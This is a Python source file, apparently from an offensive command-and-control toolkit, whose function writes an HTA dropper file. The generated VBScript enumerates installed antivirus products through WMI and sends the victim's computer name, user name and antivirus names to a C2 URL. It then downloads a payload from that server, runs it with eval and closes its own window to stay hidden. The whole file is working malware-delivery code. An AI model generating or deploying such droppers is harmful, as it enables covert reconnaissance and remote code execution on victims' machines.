#!/usr/bin/python3

def hta_gen(_Name, _C2URL):
    vHTA = "./Payloads/" + _Name + ".hta"
    vPAY = _Name + ".txt"
    try:
        hta = "<html>\n"
        hta += "<head>\n"
        hta += "<script type=text/vbs>\n"
        hta += "On Error Resume Next\n"
        hta += 'strComputer = "."\n'
        hta += r'Set oWMI = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\SecurityCenter2")'
        hta += "\n"
        hta += 'Set colItems = oWMI.ExecQuery("Select * from AntiVirusProduct")\n'
        hta += 'Set o = CreateObject("MSXML2.XMLHTTP")\n'
        hta += 'Set s = CreateObject("WScript.Shell")\n'
        hta += 'strInfo = s.expandenvironmentstrings("%COMPUTERNAME%")\n'
        hta += 'strInfo = strInfo & "%20" & s.expandenvironmentstrings("%USERNAME%")\n'
        hta += 'o.Open "GET", "'
        hta += str(_C2URL)
        hta += "/"
        hta += 'phonehome.html?b=" & strInfo, False\n'
        hta += "o.send\n"
        hta += "For Each objItem In colItems\n"
        hta += 'o.Open "GET", "'
        hta += str(_C2URL)
        hta += "/"
        hta += 'vbtest.aspx?a=" & Replace(objItem.DisplayName, " ", "%20"), False\n'
        hta += "o.send\n"
        hta += "Next\n"
        hta += 'Set scriblin = CreateObject("MSXML2.ServerXMLHTTP.6.0")\n'
        hta += 'scriblin.Open "GET", "'
        hta += str(_C2URL)
        hta += "/"
        hta += str(vPAY)
        hta += '", False'
        hta += "\nscriblin.send\n"
        hta += "scriblurt = scriblin.responsetext\n"
        hta += "</script>\n"
        hta += "<script type=text/javascript>eval(scriblurt);</script>\n"
        hta += "</head>\n"
        hta += "<body>\n"
        hta += "<script type=text/javascript>self.close();</script>\n"
        hta += "</body>\n"
        hta += "</html>\n"

        hf = open(vHTA, "w+")
        hf.write(hta)
        hf.close()

    except Exception as e:
        print('\n[!] Error, Unable to write .HTA Dropper.')
        print(' Yielded the following error %s' % e)
